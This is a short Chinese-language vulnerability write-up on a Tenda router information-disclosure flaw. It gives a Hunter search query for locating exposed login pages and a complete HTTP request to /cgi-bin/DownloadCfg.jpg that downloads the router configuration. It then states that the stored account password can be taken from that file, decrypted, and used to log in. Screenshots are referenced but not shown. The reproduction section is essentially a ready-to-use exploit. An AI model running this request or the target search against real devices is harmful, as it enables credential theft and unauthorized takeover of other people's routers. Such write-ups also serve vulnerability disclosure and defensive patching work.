# Tenda 路由器 DownloadCfg 信息泄露漏洞

# 一、漏洞描述
Tenda 路由器是深圳市吉祥腾达科技有限公司的一款智能无限路由器。Tenda 路由器存在信息泄露漏洞，攻击者通过构造特殊 URL 地址，读取系统敏感信息网访问该系统。

# 二、影响版本
+ Tenda 路由器

# 三、资产测绘
+ hunter`web.title="Tenda | LOGIN"`
+ 特征

![1701753587120-3c35a8f8-5e6c-44fc-a622-f307f0b5e7fc.png](./img/HuzV0y4anBpmEYe1/1701753587120-3c35a8f8-5e6c-44fc-a622-f307f0b5e7fc-543813.png)

# 四、漏洞复现
```java
GET /cgi-bin/DownloadCfg.jpg HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: lang=cn,en
Upgrade-Insecure-Requests: 1
```

![1701753858226-d38759e2-793c-45df-83c1-16c137293980.png](./img/HuzV0y4anBpmEYe1/1701753858226-d38759e2-793c-45df-83c1-16c137293980-207037.png)

从配置文件中可找到系统账号密码

![1701753905473-968c5560-03de-480e-81eb-4e6028247296.png](./img/HuzV0y4anBpmEYe1/1701753905473-968c5560-03de-480e-81eb-4e6028247296-014519.png)

解密后成功登录系统

![1701753934193-5e17d3df-29e6-4613-a5d9-2ac1258b5991.png](./img/HuzV0y4anBpmEYe1/1701753934193-5e17d3df-29e6-4613-a5d9-2ac1258b5991-492114.png)

![1701753950653-631706d4-3fa3-4c1a-bf44-e84c5f7514c9.png](./img/HuzV0y4anBpmEYe1/1701753950653-631706d4-3fa3-4c1a-bf44-e84c5f7514c9-018661.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gk3rgwxmuynm2p33>